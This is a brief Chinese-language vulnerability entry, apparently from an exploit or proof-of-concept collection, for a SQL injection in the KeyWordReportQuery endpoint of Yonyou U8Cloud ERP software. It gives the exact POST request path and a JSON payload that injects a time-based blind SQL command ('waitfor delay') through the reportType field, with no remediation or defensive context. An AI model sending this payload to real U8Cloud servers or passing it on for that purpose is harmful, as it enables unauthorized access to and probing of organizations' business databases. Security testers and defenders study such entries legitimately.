# 用友U8Cloud-KeyWordReportQuery存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **请求**：`POST /service/~iufo/nc.itf.iufo.mobilereport.data.KeyWordReportQuery HTTP/1.1`

**Payload**
```
{"reportType":"1';waitfor delay '0:0:3'-- ","pageInfo":{"currentPageIndex":1,"pageSize":1},"keyword":[]}
```